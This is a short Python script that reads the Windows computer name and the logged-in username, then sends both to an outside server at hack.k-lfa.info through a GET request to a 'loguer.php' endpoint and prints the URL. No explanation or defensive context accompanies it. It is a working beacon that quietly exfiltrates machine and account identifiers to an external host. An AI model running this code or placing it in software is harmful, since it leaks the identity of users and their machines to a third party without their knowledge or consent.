#!/usr/bin/python3
import os
import requests

name_of_pc = os.environ['COMPUTERNAME']
username = os.getlogin()
data =  { 'username' :  str(username) ,  'name_of_pc' :  str(name_of_pc) }

r = requests . get ('https://hack.k-lfa.info/loguer.php?c=' , params = data)
print(r.url)